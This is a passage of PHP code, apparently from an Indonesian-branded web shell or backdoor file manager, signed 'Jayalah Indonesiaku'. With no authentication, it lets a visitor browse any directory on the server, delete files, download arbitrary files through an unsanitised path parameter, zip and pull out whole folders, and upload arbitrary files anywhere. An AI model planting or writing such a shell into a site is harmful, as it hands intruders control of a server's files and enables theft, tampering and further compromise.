// Jayalah Indonesiaku
function zipFolder($source, $destination) {
    $zip = new ZipArchive();
    if (!$zip->open($destination, ZipArchive::CREATE | ZipArchive::OVERWRITE)) return false;

    $source = realpath($source);
    if (is_dir($source)) {
        $iterator = new RecursiveDirectoryIterator($source);
        foreach (new RecursiveIteratorIterator($iterator, RecursiveIteratorIterator::SELF_FIRST) as $file) {
            if ($file->isDir()) continue;
            $filePath = $file->getRealPath();
            $relativePath = substr($filePath, strlen($source) + 1);
            $zip->addFile($filePath, $relativePath);
        }
    }
    return $zip->close();
}

// Navigasi direktori bebas
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
if (!is_dir($currentDir)) $currentDir = getcwd();

// Delete file
if (isset($_GET['delete'])) {
    $del = $currentDir . DIRECTORY_SEPARATOR . basename($_GET['delete']);
    if (is_file($del)) unlink($del);
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}

// Download file
if (isset($_GET['download']) && is_file($currentDir . DIRECTORY_SEPARATOR . $_GET['download'])) {
    $file = $currentDir . DIRECTORY_SEPARATOR . $_GET['download'];
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Content-Type: application/octet-stream');
    readfile($file);
    exit;
}

// Zip folder
if (isset($_GET['zip']) && is_dir($currentDir . DIRECTORY_SEPARATOR . $_GET['zip'])) {
    $folder = $currentDir . DIRECTORY_SEPARATOR . $_GET['zip'];
    $zipPath = $currentDir . DIRECTORY_SEPARATOR . basename($folder) . ".zip";
    zipFolder($folder, $zipPath);
    header('Content-Disposition: attachment; filename="' . basename($zipPath) . '"');
    header('Content-Type: application/zip');
    readfile($zipPath);
    unlink($zipPath);
    exit;
}

// Upload file
if (isset($_FILES['file_upload']) && $_FILES['file_upload']['error'] === UPLOAD_ERR_OK) {
    $uploadedFile = $currentDir . DIRECTORY_SEPARATOR . basename($_FILES['file_upload']['name']);
    if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $uploadedFile)) {
        echo "<script>alert('File berhasil di-upload!');</script>";
    } else {
        echo "<script>alert('Gagal meng-upload file.');</script>";
    }
}
